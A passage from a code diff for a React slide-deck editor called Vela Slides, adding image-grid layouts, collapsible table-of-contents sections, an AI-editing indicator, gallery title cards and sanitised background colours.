+    // re-clamp at the sink for any slide object that reached here unsanitized.
+    const cols = slide.imageCols ? Math.min(6, Math.max(1, slide.imageCols | 0)) : gridColsFor(runLen, region);
+    const rows = Math.ceil(runLen / cols);
+    const lastRowCount = runLen - (rows - 1) * cols;
+    const incomplete = lastRowCount < cols;
+    const gap = slide.gap || 12;
+    return (
+      <div key={`__imgrid-${idxs[0]}`} data-testid="image-grid" data-image-grid={region} data-image-count={runLen}
+        style={{ display: "grid", gridTemplateColumns: `repeat(${cols * 2}, minmax(0, 1fr))`, gridAutoRows: "minmax(0, 1fr)", gap, flex: 1, minHeight: 0, minWidth: 0, width: "100%", alignItems: "stretch" }}>
+        {idxs.map((bi, k) => {
+          const firstOfLastRow = k === (rows - 1) * cols;
+          const gridColumn = (incomplete && firstOfLastRow)
+            ? `${cols - lastRowCount + 1} / span 2`
+            : "span 2";
+          const rendered = renderBlockWithComments({ ...blocks[bi], _gridCell: true }, bi);
+          const [blockEl, ...rest] = rendered;
+          // Make the block wrapper fill its cell height so the image (height:100%)
+          // and objectFit:contain letterbox uniformly across mixed aspect ratios.
+          const filled = React.cloneElement(blockEl, {
+            style: { ...(blockEl.props.style || {}), display: "flex", flexDirection: "column", flex: 1, minHeight: 0, minWidth: 0, width: "100%" },
+          });
+          return (
+            <div key={`__imgcell-${bi}`} data-testid="image-grid-cell" style={{ gridColumn, display: "flex", flexDirection: "column", minWidth: 0, minHeight: 0 }}>
+              {filled}{rest}
+            </div>
+          );
+        })}
+      </div>
+    );
+  };
+
+  // Walk the stacked blocks and replace each maximal run of >=2 adjacent image
+  // blocks with a balanced image grid (full region). Single images render as before.
+  const renderStackWithImageGrids = () => {
+    const out = [];
+    let i = 0;
+    while (i < blocks.length) {
+      if (blocks[i].type === "image") {
+        let j = i;
+        while (j < blocks.length && blocks[j].type === "image") j++;
+        if (j - i >= 2) {
+          const idxs = [];
+          for (let k = i; k < j; k++) idxs.push(k);
+          out.push(renderImageGrid(idxs, "full"));
+          i = j;
+          continue;
+        }
+      }
+      out.push(...renderBlockWithComments(blocks[i], i));
+      i++;
+    }
+    return out;
+  };
+
   // Build content: split layout or standard stacked layout
   const renderBlocks = () => {
     if (isCols) {
@@ -3505,11 +4100,16 @@ function SlideContent({ slide, index, total, branding, editable, onEdit, present
       // Apply the measured height cap to each image (unless the author pinned its
       // own maxHeight). A bare number becomes px on the <img>, so it caps the
       // image directly — independent of the wrapper/zoom chrome between here and it.
-      const imageCol = <div key="__images" style={{ flex: slide.imageFlex || 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: splitJustify, gap: slide.gap || 12, minWidth: 0, height: "100%" }}>{imageIdxs.flatMap((i) => renderBlockWithComments(splitImgMaxH != null && blocks[i].maxHeight == null ? { ...blocks[i], maxHeight: splitImgMaxH } : blocks[i], i))}</div>;
+      // >=2 images beside content → grid them (half region) so they fill the column
+      // balanced instead of stacking vertically. Single image keeps the height-capped
+      // column so a lone side image conforms to the content column's height.
+      const imageCol = imageIdxs.length >= 2
+        ? <div key="__images" style={{ flex: slide.imageFlex || 1, display: "flex", flexDirection: "column", justifyContent: "center", minWidth: 0, height: "100%" }}>{renderImageGrid(imageIdxs, "half")}</div>
+        : <div key="__images" style={{ flex: slide.imageFlex || 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: splitJustify, gap: slide.gap || 12, minWidth: 0, height: "100%" }}>{imageIdxs.flatMap((i) => renderBlockWithComments(splitImgMaxH != null && blocks[i].maxHeight == null ? { ...blocks[i], maxHeight: splitImgMaxH } : blocks[i], i))}</div>;
       return imageOnRight ? [contentCol, imageCol] : [imageCol, contentCol];
     }
     if (isSoloImage) return renderBlockWithComments({ ...blocks[0], _solo: true }, 0);
-    return blocks.flatMap((b, i) => renderBlockWithComments(b, i));
+    return renderStackWithImageGrids();
   };
 
   return (
@@ -3540,9 +4140,17 @@ function SlideContent({ slide, index, total, branding, editable, onEdit, present
 
 // © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
 // ━━━ Reducer ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-const init = { deckTitle: "Untitled", guidelines: "", lanes: [], selectedId: null, slideIndex: 0, selectedSlideIndices: [], fullscreen: VELA_PRESENTATION_MODE, fontScale: 1, chatOpen: false, reviewMode: false, commentsPanelOpen: false, chatMessages: [{ role: "assistant", content: "Welcome aboard Vela. Paste your agenda or tell me where we're sailing. ⛵🖖", ts: now() }], chatLoading: false, lastDebug: "", branding: { ...defaultBranding }, veraMode: "editor", teacherHistory: {}, teacherLoading: false };
+// collapsedSections: array of item ids whose TOC section is folded. View state only —
+// never persisted into the deck (see LOAD reset / _fullRewrite handling). Lifted out of
+// ModuleList local useState (CR2) so the TOC disclosure keys and the collapsed-header
+// current-slide marker can read/act on it.
+// aiWork (CR5): ephemeral UI signal (which slide Vera is actively editing) — never persisted.
+const init = { deckTitle: "Untitled", guidelines: "", lanes: [], selectedId: null, slideIndex: 0, selectedSlideIndices: [], collapsedSections: [], fullscreen: VELA_PRESENTATION_MODE, fontScale: 1, chatOpen: false, reviewMode: false, commentsPanelOpen: false, chatMessages: [{ role: "assistant", content: "Welcome aboard Vela. Paste your agenda or tell me where we're sailing. ⛵🖖", ts: now() }], chatLoading: false, lastDebug: "", branding: { ...defaultBranding }, veraMode: "editor", teacherHistory: {}, teacherLoading: false, aiWork: null };
 
-const NO_HISTORY = new Set(["SELECT", "SET_SLIDE_INDEX", "SET_SLIDE_SELECTION", "SET_FULLSCREEN", "SET_FONT_SCALE", "DESELECT", "SET_CHAT", "ADD_MSG", "SET_LOADING", "SET_DEBUG", "TOGGLE_LANE", "LOAD", "SET_TITLE", "STREAM_TOOL", "FINALIZE_STREAM", "RESET_CHAT", "NEW_DECK", "CLEAR_BOOTSTRAP", "SET_VERA_MODE", "TEACHER_MSG", "TEACHER_LOADING", "TEACHER_CLEAR", "SET_REVIEW_MODE", "SET_COMMENTS_PANEL"]);
+// CR5: SET_AI_WORK is an ephemeral UI signal (which slide Vera is actively
+// editing) — never part of undo/redo history. CR2 TOGGLE/SET_SECTION_COLLAPSE
+// are view-only too.
+const NO_HISTORY = new Set(["SELECT", "SET_SLIDE_INDEX", "SET_SLIDE_SELECTION", "SET_FULLSCREEN", "SET_FONT_SCALE", "DESELECT", "SET_CHAT", "ADD_MSG", "SET_LOADING", "SET_DEBUG", "TOGGLE_LANE", "LOAD", "SET_TITLE", "STREAM_TOOL", "FINALIZE_STREAM", "RESET_CHAT", "NEW_DECK", "CLEAR_BOOTSTRAP", "SET_VERA_MODE", "TEACHER_MSG", "TEACHER_LOADING", "TEACHER_CLEAR", "SET_REVIEW_MODE", "SET_COMMENTS_PANEL", "TOGGLE_SECTION_COLLAPSE", "SET_SECTION_COLLAPSED", "SET_AI_WORK"]);
 const MAX_HISTORY = 50;
 
 function innerReducer(state, a) {
@@ -3701,8 +4309,27 @@ function innerReducer(state, a) {
         return i;
       }) })), selectedId: a.toId, slideIndex: a.toIndex != null ? a.toIndex : (() => { for (const l of state.lanes) { const it = l.items.find((i) => i.id === a.toId); if (it) return it.slides?.length || 0; } return 0; })() };
     }
-    case "SELECT": return { ...state, selectedId: a.id, slideIndex: a.slideIndex ?? 0, selectedSlideIndices: [] };
-    case "SET_SLIDE_INDEX": return { ...state, slideIndex: a.index, selectedSlideIndices: [] };
+    // CR5/D4: switching module/slide clears aiWork so a slide never keeps shimmering
+    // after the user navigates away from an in-flight (or aborted) AI op.
+    case "SELECT": return { ...state, selectedId: a.id, slideIndex: a.slideIndex ?? 0, selectedSlideIndices: [], aiWork: null };
+    case "SET_SLIDE_INDEX": return { ...state, slideIndex: a.index, selectedSlideIndices: [], aiWork: null };
+    // CR2: TOC section collapse state (view-only; excluded from undo via NO_HISTORY).
+    // `all` mirrors the mouse Ctrl/Cmd-click "collapse/expand ALL": if THIS id is
+    // currently collapsed → expand everything, else collapse every section (caller
+    // passes the full id list in `ids`). Otherwise toggle just `id`.
+    case "TOGGLE_SECTION_COLLAPSE": {
+      const cur = Array.isArray(state.collapsedSections) ? state.collapsedSections : [];
+      if (a.all) { const isCollapsed = cur.includes(a.id); return { ...state, collapsedSections: isCollapsed ? [] : [...(a.ids || [])] }; }
+      return { ...state, collapsedSections: cur.includes(a.id) ? cur.filter((x) => x !== a.id) : [...cur, a.id] };
+    }
+    // Deterministic expand/collapse for the disclosure keys (Right=expand, Left=collapse).
+    // `all` (Ctrl/Cmd+Left/Right) forces every section collapsed/expanded at once.
+    case "SET_SECTION_COLLAPSED": {
+      const cur = Array.isArray(state.collapsedSections) ? state.collapsedSections : [];
+      if (a.all) return { ...state, collapsedSections: a.collapsed ? [...(a.ids || [])] : [] };
+      if (a.collapsed) return cur.includes(a.id) ? state : { ...state, collapsedSections: [...cur, a.id] };
+      return cur.includes(a.id) ? { ...state, collapsedSections: cur.filter((x) => x !== a.id) } : state;
+    }
     // Multi-select of slide rows in the section list (shift/cmd-click). `indices`
     // are raw slide indices within the currently selected module; `index` (the
     // clicked row) becomes the active slideIndex. An empty `indices` means "just
@@ -3793,9 +4420,15 @@ function innerReducer(state, a) {
       const last = msgs.length - 1;
       if (last < 0 || !msgs[last]._streaming) return state;
       msgs[last] = { ...msgs[last], content: typeof a.content === "string" ? a.content : String(a.content || ""), jumps: a.jumps, _streaming: false, _thinking: false };
-      return { ...state, chatMessages: msgs };
+      // CR5 fail-safe: the Vera turn is over — never leave a slide stuck shimmering.
+      return { ...state, chatMessages: msgs, aiWork: null };
     }
     case "SET_LOADING": return { ...state, chatLoading: a.value };
+    // CR5: single source of truth for "Vera is working on this slide". Value is
+    // { itemId, slideIdx } (an "*" sentinel = deck-wide/batch) or null to clear.
+    // Both the chat/Vera engine tool path and the toolbar AI ops feed this; the
+    // SlidePanel reads it to drive the vera-thinking scan + magic-reveal settle.
+    case "SET_AI_WORK": return { ...state, aiWork: a.value || null };
     case "SET_DEBUG": return { ...state, lastDebug: a.text };
     case "LOAD_LANES": {
       // SECURITY (audit 2025-05, H1): Vera tool writes (set_slides / add_slide /
@@ -3831,7 +4464,10 @@ function reducer(hist, a) {
     if (hist.past.length === 0) return hist;
     const prev = hist.past[hist.past.length - 1];
     // Force-clear loading state — if Vera was mid-flight, the async op is now stale
-    const cleaned = { ...prev, chatLoading: false };
+    // (CR5: also clear aiWork so a reverted slide never stays stuck shimmering).
+    // CR2/D1: collapsedSections is view-only (in NO_HISTORY) — carry the CURRENT value
+    // forward across UNDO so a content undo never silently re-folds/unfolds the TOC.
+    const cleaned = { ...prev, chatLoading: false, aiWork: null, collapsedSections: hist.present.collapsedSections };
     // Clamp selectedId/slideIndex — restored state may reference modules/slides modified after snapshot
     if (cleaned.selectedId && cleaned.lanes) {
       let found = false;
@@ -3858,7 +4494,8 @@ function reducer(hist, a) {
   if (a.type === "REDO") {
     if (hist.future.length === 0) return hist;
     const next = hist.future[0];
-    const cleaned = { ...next, chatLoading: false };
+    // CR2/D1: keep view-only collapsedSections unchanged across REDO (see UNDO above).
+    const cleaned = { ...next, chatLoading: false, aiWork: null, collapsedSections: hist.present.collapsedSections };
     // Clamp selectedId/slideIndex
     if (cleaned.selectedId && cleaned.lanes) {
       let found = false;
@@ -4730,9 +5367,16 @@ ${ICON_LIST}`;
   // Handle single block or array of blocks (for split operations)
   const newBlocks = Array.isArray(result) ? result : [result];
 
-  // Extra safeguard: strip any slide-ONLY keys that leaked into blocks
-  // NOTE: bg, padding, gap, align, accent are valid on BOTH slides and blocks — do NOT strip them
-  const SLIDE_ONLY_KEYS = new Set(["blocks", "bgGradient", "bgImage", "duration", "verticalAlign", "mutedColor", "notes", "presentCard", "layout", "contentFlex", "imageFlex", "splitGap", "speakerNotes", "timeLock", "L", "R"]);
+  // Extra safeguard: strip any slide-ONLY keys that leaked into blocks.
+  // DERIVED, not hand-maintained: "slide-only" is exactly the set difference
+  // SAFE_SLIDE_KEYS − SAFE_BLOCK_KEYS (part-imports.jsx), so this list can never
+  // drift from the ingress allowlists. Keys valid on BOTH (bg, color, padding,
+  // gap, align, title, author, hidden…) are in both sets and so are not stripped.
+  // `presentCard` is added explicitly: it is a module/item-level key the model
+  // sometimes emits onto a slide, and it is not in either allowlist.
+  const SLIDE_ONLY_KEYS = new Set(
+    [...SAFE_SLIDE_KEYS].filter((k) => !SAFE_BLOCK_KEYS.has(k)).concat(["presentCard"])
+  );
   for (const nb of newBlocks) {
     for (const k of SLIDE_ONLY_KEYS) { if (k in nb) delete nb[k]; }
   }
@@ -5246,7 +5890,7 @@ function computeSlideLayoutStats(slideEl) {
 }
 
 // ━━━ Virtual Slide ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function VirtualSlide({ slide, index, total, innerRef, branding, editable, onEdit, mode = "fit-width", onBlockEdit, blockEditing, fontScale, virtualW, virtualH, bordered, reviewMode, itemId, dispatch: externalDispatch, displayIndex, displayTotal }) {
+function VirtualSlide({ slide, index, total, innerRef, branding, editable, onEdit, mode = "fit-width", onBlockEdit, blockEditing, fontScale, virtualW, virtualH, bordered, reviewMode, itemId, dispatch: externalDispatch, displayIndex, displayTotal, forceEdit }) {
   const outerRef = useRef(null);
   const isFill = mode === "fill";
 
@@ -5301,7 +5945,10 @@ function VirtualSlide({ slide, index, total, innerRef, branding, editable, onEdi
     ro.observe(el); return () => ro.disconnect();
   }, [mode, vw, vh, isFill]);
 
-  const bg = slide?.bg || slide?.bgGradient || T.slideBg;
+  // Encoder-gated the same way the main SlideContent render does (part-blocks.jsx)
+  // — this thumbnail/fullscreen wrapper is a separate render sink for the same
+  // deck-supplied bg/bgGradient scalars. (v13.26)
+  const bg = cssColor(slide?.bg) || cssGradient(slide?.bgGradient) || T.slideBg;
   const isFullscreen = mode === "fit-viewport" || isFill;
   const aspectRatio = `${vw}/${vh}`;
 
@@ -5316,7 +5963,7 @@ function VirtualSlide({ slide, index, total, innerRef, branding, editable, onEdi
         transform: isFullscreen ? `translate(${offset.x}px, ${offset.y}px) scale(${scale})` : `scale(${scale})`,
         transformOrigin: "top left", background: bg, position: "absolute", top: 0, left: 0,
       }}>
-        {slide && <SlideContent key={`${index}-${vw}-${vh}`} slide={slide} index={index} total={total} branding={branding} editable={editable} onEdit={onEdit} presenting={(mode === "fit-viewport" || isFill) && !bordered} onBlockEdit={onBlockEdit} blockEditing={blockEditing} fontScale={fontScale} reviewMode={reviewMode} itemId={itemId} dispatch={externalDispatch} displayIndex={displayIndex} displayTotal={displayTotal} />}
+        {slide && <SlideContent key={`${index}-${vw}-${vh}`} slide={slide} index={index} total={total} branding={branding} editable={editable} onEdit={onEdit} presenting={((mode === "fit-viewport" || isFill) && !bordered) && !forceEdit} onBlockEdit={onBlockEdit} blockEditing={blockEditing} fontScale={fontScale} reviewMode={reviewMode} itemId={itemId} dispatch={externalDispatch} displayIndex={displayIndex} displayTotal={displayTotal} />}
       </div>
     </div>
   );
@@ -5740,7 +6387,7 @@ function GalleryThumb({ slide, slideIdx, total, branding }) {
     <div style={{ width: "100%", aspectRatio: "16/9", position: "relative", overflow: "hidden" }}>
       <VirtualSlide slide={slide} index={slideIdx} total={total} branding={branding} editable={false} mode="fit-width" bordered />
       {!loaded && (
-        <div style={{ position: "absolute", inset: 0, zIndex: 2, background: slide?.bg || T.slideBg, display: "flex", alignItems: "center", justifyContent: "center", borderRadius: 6, transition: "opacity 0.3s ease" }}>
+        <div style={{ position: "absolute", inset: 0, zIndex: 2, background: cssColor(slide?.bg) || T.slideBg, display: "flex", alignItems: "center", justifyContent: "center", borderRadius: 6, transition: "opacity 0.3s ease" }}>
           <div style={{ width: "60%", height: 6, borderRadius: 3, backgroundImage: shimmerBg, backgroundSize: "200% 100%", animation: "velaGalleryShimmer 1.4s ease-in-out infinite" }} />
         </div>
       )}
@@ -5860,13 +6507,19 @@ function GalleryView({ lanes, currentConceptId, slideIndex, dispatch, onClose, b
     const result = [];
     for (const lane of lanes) {
       for (const item of lane.items) {
+        // CR1: section title cards (🎬 presentCard) render in the gallery/overview
+        // exactly as they lead the module in presentation. Virtual, non-draggable,
+        // excluded from the module's real-slide count; clicking selects the module.
+        if (item.presentCard) {
+          result.push({ slide: buildTitleCardSlide(item, lane, branding), itemId: item.id, slideIdx: 0, moduleTitle: item.title, laneTitle: lane.title, isCurrent: false, isTitleCard: true });
+        }
         for (let si = 0; si < (item.slides || []).length; si++) {
           result.push({ slide: item.slides[si], itemId: item.id, slideIdx: si, moduleTitle: item.title, laneTitle: lane.title, isCurrent: item.id === currentConceptId && si === slideIndex });
         }
       }
     }
     return result;
-  }, [lanes, currentConceptId, slideIndex]);
+  }, [lanes, currentConceptId, slideIndex, branding]);
 
   useEffect(() => { setTimeout(() => { activeRef.current?.scrollIntoView({ block: "center", behavior: "smooth" }); }, 100); }, []);
 
@@ -5961,21 +6614,27 @@ function GalleryView({ lanes, currentConceptId, slideIndex, dispatch, onClose, b
   // Tag first slide of each module + compute slide counts
   const taggedSlides = useMemo(() => {
     const counts = {};
-    for (const s of allSlides) counts[s.itemId] = (counts[s.itemId] || 0) + 1;
+    // Count only real slides — virtual title cards don't inflate the module count.
+    for (const s of allSlides) if (!s.isTitleCard) counts[s.itemId] = (counts[s.itemId] || 0) + 1;
     let lastItemId = null;
     return allSlides.map((s) => {
       const isFirst = s.itemId !== lastItemId;
       lastItemId = s.itemId;
-      return { ...s, isFirst, moduleCount: counts[s.itemId] };
+      return { ...s, isFirst, moduleCount: counts[s.itemId] || 0 };
     });
   }, [allSlides]);
+
+  // CR1/D8: the per-thumbnail page badge denominator must exclude virtual title cards
+  // so the gallery reads "/ 28" (real slides) — matching presentation's globalSlideTotal —
+  // not "/ 29" (which would count the virtual card).
+  const realSlideTotal = useMemo(() => allSlides.filter((s) => !s.isTitleCard).length, [allSlides]);
 
   return (
     <div onClick={onClose} data-teacher-panel style={{ position: "fixed", inset: 0, zIndex: 10000, background: T.isDark ? "rgba(0,0,0,0.92)" : "rgba(241,245,249,0.96)", backdropFilter: "blur(8px)", display: "flex", flexDirection: "column", overflow: "hidden" }}>
       <div onClick={(e) => e.stopPropagation()} style={{ padding: "16px 24px", display: "flex", alignItems: "center", gap: 12, borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
         <span style={{ fontSize: 18 }}>🗂</span>
         <span style={{ fontFamily: FONT.mono, fontSize: 14, fontWeight: 700, color: T.accent, letterSpacing: "0.05em" }}>GALLERY</span>
-        <span style={{ fontFamily: FONT.mono, fontSize: 13, color: T.textMuted }}>{allSlides.length} slides</span>
+        <span style={{ fontFamily: FONT.mono, fontSize: 13, color: T.textMuted }}>{allSlides.filter((s) => !s.isTitleCard).length} slides</span>
         <span style={{ marginLeft: "auto", fontFamily: FONT.mono, fontSize: 13, color: T.textDim }}>+/− zoom · drag to reorder · G or ESC to close</span>
         <button data-testid="gallery-close" onClick={onClose} style={{ background: "none", border: "none", color: T.textMuted, cursor: "pointer", fontSize: 18, padding: 4 }}>✕</button>
       </div>
@@ -5989,10 +6648,12 @@ function GalleryView({ lanes, currentConceptId, slideIndex, dispatch, onClose, b
             const isDragSrc = dragSrc && dragSrc.itemId === s.itemId && dragSrc.slideIdx === s.slideIdx;
             const isDropHere = dropTarget && dropTarget.itemId === s.itemId && dropTarget.slideIdx === s.slideIdx;
             const dropSide = isDropHere ? dropTarget.side : null;
-            const cardKey = s.itemId + "|" + s.slideIdx;
+            // Title cards get a distinct key so they never collide with real slide 0,
+            // and they are excluded from drag hit-testing / reorder (virtual, not real).
+            const cardKey = s.isTitleCard ? s.itemId + "|tc" : s.itemId + "|" + s.slideIdx;
             return (
-              <div key={"s-" + cardKey} ref={(el) => { cardRefs.current[cardKey] = el; if (isCurrent && el) activeRef.current = el; }}
-                onMouseDown={(e) => handleMouseDown(e, s)}
+              <div key={"s-" + cardKey} data-testid={s.isTitleCard ? "gallery-title-card" : "gallery-slide"} ref={s.isTitleCard ? null : (el) => { cardRefs.current[cardKey] = el; if (isCurrent && el) activeRef.current = el; }}
+                onMouseDown={s.isTitleCard ? undefined : (e) => handleMouseDown(e, s)}
                 onClick={() => { if (!dragActive) jump(s.itemId, s.slideIdx); }}
                 style={{ width: thumbWidth, cursor: dragActive ? "grabbing" : "pointer", transition: dragActive ? "none" : "all 0.15s", opacity: isDragSrc ? 0.3 : 1, position: "relative" }}>
                 {/* Drop indicator — left */}
@@ -6013,13 +6674,13 @@ function GalleryView({ lanes, currentConceptId, slideIndex, dispatch, onClose, b
                 <div style={{ borderRadius: "0 0 8px 8px", border: cardBorder, borderTop: "none", boxShadow: cardShadow, background: T.bgCard, overflow: "hidden" }}
                   onMouseEnter={(e) => { if (!isCurrent && !dragSrc) { e.currentTarget.style.borderColor = T.borderLight; } }}
                   onMouseLeave={(e) => { if (!isCurrent) { e.currentTarget.style.borderColor = T.border; } }}>
-                  <GalleryThumb slide={s.slide} slideIdx={s.slideIdx} total={allSlides.length} branding={branding} />
+                  <GalleryThumb slide={s.slide} slideIdx={s.slideIdx} total={realSlideTotal} branding={branding} />
                   <div style={{ padding: "6px 10px", background: isCurrent ? T.accent + "15" : T.isDark ? "rgba(255,255,255,0.04)" : "rgba(0,0,0,0.03)", display: "flex", alignItems: "center", gap: 6 }}>
-                    <span style={{ fontFamily: FONT.mono, fontSize: 10, color: isCurrent ? T.accent : T.textDim, fontWeight: 700 }}>{s.slideIdx + 1}</span>
+                    <span title={s.isTitleCard ? "Section title card" : undefined} style={{ fontFamily: FONT.mono, fontSize: 10, color: isCurrent ? T.accent : T.textDim, fontWeight: 700 }}>{s.isTitleCard ? "🎬" : s.slideIdx + 1}</span>
                     {(() => { const oc = (s.slide.comments || []).filter((c) => c.status === "open").length; return oc > 0 ? <span style={{ width: 8, height: 8, borderRadius: 4, background: T.amber, flexShrink: 0 }} title={`${oc} comment${oc > 1 ? "s" : ""}`} /> : null; })()}
                     {s.slide?.studyNotes?.text ? <span title="Has offline study notes" data-study-marker style={{ fontSize: 11, lineHeight: 1, flexShrink: 0, filter: `drop-shadow(0 0 2px ${T.accent}80)` }}>🎓</span> : null}
                     <span style={{ fontSize: 13, color: isCurrent ? T.text : T.textMuted, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", flex: 1, fontFamily: FONT.body }}>{getSlideTitle(s.slide, s.slideIdx)}</span>
-                    <button onClick={(e) => { e.stopPropagation(); dispatch({ type: "REMOVE_SLIDE", id: s.itemId, index: s.slideIdx }); }} title="Delete slide" style={{ background: "none", border: "none", cursor: "pointer", padding: "2px 4px", fontSize: 13, color: T.textDim, borderRadius: 3, opacity: 0.4, transition: "opacity 0.15s, color 0.15s" }} onMouseEnter={(e) => { e.currentTarget.style.opacity = "1"; e.currentTarget.style.color = "#ef4444"; }} onMouseLeave={(e) => { e.currentTarget.style.opacity = "0.4"; e.currentTarget.style.color = T.textDim; }}>✕</button>
+                    {!s.isTitleCard && <button onClick={(e) => { e.stopPropagation(); dispatch({ type: "REMOVE_SLIDE", id: s.itemId, index: s.slideIdx }); }} title="Delete slide" style={{ background: "none", border: "none", cursor: "pointer", padding: "2px 4px", fontSize: 13, color: T.textDim, borderRadius: 3, opacity: 0.4, transition: "opacity 0.15s, color 0.15s" }} onMouseEnter={(e) => { e.currentTarget.style.opacity = "1"; e.currentTarget.style.color = "#ef4444"; }} onMouseLeave={(e) => { e.currentTarget.style.opacity = "0.4"; e.currentTarget.style.color = T.textDim; }}>✕</button>}
                   </div>
                 </div>
               </div>
@@ -6508,6 +7169,40 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
   const lanesRef = useRef(lanes); lanesRef.current = lanes;
   const conceptIdRef = useRef(concept.id); conceptIdRef.current = concept.id;
   const slideIndexRef = useRef(slideIndex); slideIndexRef.current = slideIndex;
+  // CR5: the single "Vera is working on THIS on-screen slide" signal, read from
+  // the reducer's aiWork flag (fed by BOTH the chat/Vera engine tool path and the
+  // toolbar AI ops). "*" is the deck-wide/batch sentinel — a batch op only ever
+  // animates whichever of its targets is currently on screen, never off-screen.
+  const aiWorkingHere = !!(state.aiWork &&
+    (state.aiWork.itemId === concept.id || state.aiWork.itemId === "*") &&
+    (state.aiWork.slideIdx === slideIndex || state.aiWork.slideIdx === "*"));
+  // When the working flag clears off this slide (op completed / cancelled / error),
+  // play the existing magic-reveal settle once — the unified completion for every
+  // AI op (chat + toolbar). This is what makes chat/Vera edits settle like the
+  // toolbar ops instead of silently popping to new content.
+  // The `!revealKey` guard keeps toolbar ops (which set their own revealKey at the
+  // exact update point) from double-revealing; the chat/Vera path sets no revealKey,
+  // so it relies on this effect for the settle.
+  // CR5/D7: only settle when the AI op actually CLEARS on THIS slide — not when
+  // aiWorkingHere goes false merely because the view navigated to another slide.
+  // Guard on BOTH the itemId (module) AND the slide index being unchanged across
+  // the transition — the panel is not keyed by concept.id, so its refs persist
+  // across module switches; without the itemId dimension, switching to a DIFFERENT
+  // module whose slide sits at the same index (0===0) would wrongly settle the
+  // untouched destination slide. Same actual slide = same module + same index.
+  const prevAiWorkingHere = useRef(false);
+  const prevRevealSlideIndex = useRef(slideIndex);
+  const prevRevealItemId = useRef(concept.id);
+  useEffect(() => {
+    const sameSlide = prevRevealSlideIndex.current === slideIndex && prevRevealItemId.current === concept.id;
+    if (prevAiWorkingHere.current && !aiWorkingHere && !revealKey && sameSlide) {
+      setRevealKey(`aiw-${Date.now()}`);
+      setTimeout(() => setRevealKey(null), 1200);
+    }
+    prevAiWorkingHere.current = aiWorkingHere;
+    prevRevealSlideIndex.current = slideIndex;
+    prevRevealItemId.current = concept.id;
+  }, [aiWorkingHere, slideIndex, concept.id]); // eslint-disable-line -- revealKey read as a same-commit guard, not a trigger
   // Measure a slide's layout in a hidden offscreen 960×540 host instead of the
   // visible panel, so Improve no longer has to move the view to measure — it can
   // keep running in the background while the user browses elsewhere.
@@ -6523,8 +7218,9 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       setImproving(null);
       setCapturedThumb(null);
       setRevealKey(null);
+      dispatch({ type: "SET_AI_WORK", value: null }); // CR5: cancel clears the scan
     }
-  }, [improving]);
+  }, [improving, dispatch]);
   useEffect(() => { setBeforeSlides(null); setShowBefore(false); setShowMoveToModule(false); setEditingDuration(false); }, [concept.id]);
 
   // Shift slideIndex when entering/exiting fullscreen with presentCard
@@ -6587,6 +7283,12 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
   const [showPresenterView, setShowPresenterView] = useState(false);
   const showPresenterViewRef = useRef(false);
   const setPresenterView = (v) => { const val = typeof v === "function" ? v(showPresenterViewRef.current) : v; showPresenterViewRef.current = val; setShowPresenterView(val); };
+  // ── Present Edit — restore inline click-to-edit while presenting. OFF by
+  // default so an audience never sees edit chrome (CR-03); the presenter flips
+  // it on via the ✎ toggle or Shift+E to edit text/icons live. Always resets
+  // to off when leaving Present so the next presentation opens clean.
+  const [presentEdit, setPresentEdit] = useState(false);
+  useEffect(() => { if (!fullscreen) setPresentEdit(false); }, [fullscreen]);
   const [presentElapsed, setPresentElapsed] = useState(0); // seconds since Present mode was entered
   const presentStartRef = useRef(null);
   const [showNewSlide, setShowNewSlide] = useState(false);
@@ -6754,7 +7456,15 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
     }, [slideIndex, dispatch, fullscreen, concept.id, flatModules, showNavToast]),
   });
 
-  const SLIDE_KEYS = new Set(["title","subtitle","blocks","bullets","bg","layout","duration","quote","author","timeLock","speakerNotes"]);
+  // Paste-detection heuristic: a DISTINCTIVE subset of SAFE_SLIDE_KEYS
+  // (part-imports.jsx) — not the whole allowlist, because keys shared with
+  // blocks (color, gap, padding, align…) would make a copied BLOCK look like a
+  // slide. Filtered through SAFE_SLIDE_KEYS so it can never name a key that deck
+  // ingress strips: the two lists cannot drift apart.
+  const SLIDE_KEYS = new Set(
+    ["title","subtitle","blocks","bullets","bg","layout","duration","quote","author","timeLock","speakerNotes"]
+      .filter((k) => SAFE_SLIDE_KEYS.has(k))
+  );
   const looksLikeSlide = (obj) => obj && typeof obj === "object" && !Array.isArray(obj) && Object.keys(obj).some((k) => SLIDE_KEYS.has(k));
   const handlePaste = useCallback((e) => {
     const tag = e.target?.tagName?.toLowerCase(); if (tag === "textarea" || tag === "input") return;
@@ -6788,24 +7498,38 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
           // Empty module → brand-new full-bleed solo-image slide.
           if (slides.length === 0) { dispatch({ type: "ADD_SLIDE", id: concept.id, slide: { blocks: [{ type: "image", src: compressed }] } }); return; }
           const cur = slides[slideIndex] || {};
+          const curImgs = (cur.blocks || []).filter((b) => b.type === "image").length;
+          // Overflow cap: at most 5 images per slide. A 6th image spills onto a new
+          // image-only slide inserted after this one rather than over-packing the grid.
+          if (curImgs >= 5) {
+            const newSlides = [...slides];
+            const insertAt = slideIndex + 1;
+            newSlides.splice(insertAt, 0, { blocks: [{ type: "image", src: compressed }] });
+            dispatch({ type: "SET_SLIDES", id: concept.id, slides: newSlides });
+            dispatch({ type: "SET_SLIDE_INDEX", index: insertAt });
+            return;
+          }
           const patch = { blocks: [...(cur.blocks || []), { type: "image", src: compressed }] };
+          const n = curImgs + 1; // image count after this paste
           // Layout-aware paste: place the image beside existing body content rather
           // than always stacking it below. pasteImageLayout() respects an explicit
-          // author layout, keeps mostly-title slides and wide images stacked, and
-          // otherwise returns "image-right" (the renderer auto-splits image vs. content).
+          // author layout, keeps mostly-title/image-only slides and wide images stacked
+          // (the renderer auto-grids a run of >=2 images), promotes heavy text + >=3
+          // images to a full-width header + full-width image grid, and otherwise returns
